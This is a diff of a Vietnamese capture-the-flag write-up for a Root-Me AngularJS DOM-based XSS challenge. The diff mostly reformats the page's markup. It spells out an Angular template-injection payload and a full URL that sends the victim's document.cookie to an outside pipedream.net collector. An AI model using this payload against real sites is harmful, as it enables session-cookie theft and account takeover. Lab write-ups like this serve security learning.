@@ -170,27 +170,28 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="write-up"><a class="header" href="#write-up">WRITE UP</a></h1>
-<p><strong>Challenge:</strong> <a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS"><strong>XSS DOM Based - Angular</strong></a></p>
+                        <h1 id="xss-dom-based---angular"><a class="header" href="#xss-dom-based---angular"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS">XSS DOM Based - Angular</a></a></h1>
 <p>Thử submit giá vị vào input, ta xem được script mà website handle:</p>
-<img src="./media/image1.png" style="width:6.5in;height:3.46597in" alt="Graphical user interface, text, application Description automatically generated" />
+<p><img src="./media/image1.png" alt="" /></p>
 <p>Mất khá nhiều thời gian để tránh filter và hiểu code. Có vẻ không thể attack bằng cách “hiểu” code được. Đề bài có tên là <strong>AngularJS,</strong> tra cứu cheatsheet XSS Angular, ta có thể tìm được payload: <strong>$on.constructor('alert(1)')()</strong></p>
-<p>Để khiến JS thực thi command, ta chèn {{ }} để triển khai expression:</p>
+<p>Để khiến JS thực thi command, ta chèn <code>{{ }}</code> để triển khai expression:</p>
 <p><strong>{{$on.constructor('alert(1)')()}}</strong></p>
 <p>Tuy vậy, lúc chèn payload, website trả về:</p>
-<img src="./media/image2.png" style="width:6.24127in;height:2.78056in" alt="A screenshot of a computer Description automatically generated" />
+<p><img src="./media/image2.png" alt="" /></p>
 <p>Thử thay <strong>' "</strong> thì đã chèn thành công script:</p>
-<img src="./media/image3.png" style="width:6.5in;height:1.06319in" alt="A screenshot of a computer Description automatically generated with medium confidence" />
+<p><img src="./media/image3.png" alt="" /></p>
 <p>Chỉnh sửa payload để thực thi DOM Based XSS attack. Ta sử dụng <strong>\"</strong> để thoát chuỗi <strong>"":</strong></p>
 <p>Payload: <strong>{{$on.constructor("document.location=\"https://eol9dtzbk9673pb.m.pipedream.net?cookie=\"+document.cookie")()}}</strong></p>
-<img src="./media/image4.png" style="width:5.60752in;height:2.77081in" alt="Graphical user interface, text, application, email Description automatically generated" />
+<p><img src="./media/image4.png" alt="" /></p>
 <p>Payload đã chạy được. Giờ thì gửi payload đến admin qua Contact tab:</p>
 <p><a href="http://challenge01.root-me.org/web-client/ch35/?name=%7b%7b$on.constructor(%22document.location=%22https://eol9dtzbk9673pb.m.pipedream.net?cookie=%22%20document.cookie%22)()%7d%7d"><em>http://challenge01.root-me.org/web-client/ch35/?name={{$on.constructor("document.location=\"https://eol9dtzbk9673pb.m.pipedream.net?cookie=\"%20document.cookie")()}}</em></a></p>
-<img src="./media/image5.png" style="width:4.37015in;height:1.53329in" alt="Graphical user interface, text, application, website Description automatically generated" />
+<p><img src="./media/image5.png" alt="" /></p>
 <p>HTTP Request nhận về:</p>
-<img src="./media/image6.png" style="width:6.12427in;height:2.54327in" alt="Graphical user interface, text, application Description automatically generated" />
-<img src="./media/image7.png" style="width:5.42995in;height:2.95398in" alt="A screenshot of a computer Description automatically generated" />
-<p>- Flag: *********************************</p>
+<p><img src="./media/image6.png" alt="" /></p>
+<p><img src="./media/image7.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
 
                     </main>
 
